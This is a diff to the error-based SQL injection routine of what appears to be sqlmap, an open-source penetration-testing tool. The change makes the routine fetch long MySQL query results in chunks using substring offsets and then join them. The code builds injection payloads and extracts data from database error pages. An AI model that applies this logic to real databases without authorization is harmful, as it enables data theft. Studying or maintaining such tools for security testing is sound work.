@@ -29,7 +29,7 @@ from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
 from lib.core.enums import PAYLOAD
 from lib.core.settings import FROM_TABLE
-from lib.core.settings import MYSQL_ERROR_TRIM_LENGTH
+from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 from lib.utils.resume import resume
@@ -39,35 +39,52 @@ reqCount = 0
 def __oneShotErrorUse(expression, field):
     global reqCount
 
-    check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
-    nulledCastedField = agent.nullAndCastField(field)
+    offset = 1
+    retVal = None
 
-    if Backend.getIdentifiedDbms() == DBMS.MYSQL:
-        # Fix for MySQL odd behaviour ('Subquery returns more than 1 row')
-        nulledCastedField = nulledCastedField.replace("AS CHAR)", "AS CHAR(%d))" % MYSQL_ERROR_TRIM_LENGTH)
+    while True:
+        check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
+        nulledCastedField = agent.nullAndCastField(field)
+        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
+            nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, MYSQL_ERROR_CHUNK_LENGTH)
 
-    # Forge the error-based SQL injection request
-    vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
-    query = agent.prefixQuery(vector)
-    query = agent.suffixQuery(query)
-    injExpression = expression.replace(field, nulledCastedField, 1)
-    injExpression = unescaper.unescape(injExpression)
-    injExpression = query.replace("[QUERY]", injExpression)
-    payload = agent.payload(newValue=injExpression)
+        # Forge the error-based SQL injection request
+        vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
+        query = agent.prefixQuery(vector)
+        query = agent.suffixQuery(query)
+        injExpression = expression.replace(field, nulledCastedField, 1)
+        injExpression = unescaper.unescape(injExpression)
+        injExpression = query.replace("[QUERY]", injExpression)
+        payload = agent.payload(newValue=injExpression)
+        print payload
 
-    # Perform the request
-    page, headers = Request.queryPage(payload, content=True)
-    reqCount += 1
+        # Perform the request
+        page, headers = Request.queryPage(payload, content=True)
+        reqCount += 1
 
-    # Parse the returned page to get the exact error-based
-    # sql injection output
-    output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
-             or extractRegexResult(check, listToStrValue(headers.headers \
-             if headers else None), re.DOTALL | re.IGNORECASE)
+        # Parse the returned page to get the exact error-based
+        # sql injection output
+        output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
+                or extractRegexResult(check, listToStrValue(headers.headers \
+                if headers else None), re.DOTALL | re.IGNORECASE)
 
-    dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(output)))
+        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
+            if offset == 1:
+                retVal = output
+            else:
+                retVal += output if output else ''
 
-    return output
+            if not (output and len(output) >= MYSQL_ERROR_CHUNK_LENGTH):
+                break
+            else:
+                offset += MYSQL_ERROR_CHUNK_LENGTH
+        else:
+            retVal = output
+            break
+
+    dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(retVal)))
+
+    return retVal
 
 def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None, resumeValue=True):
     outputs = []
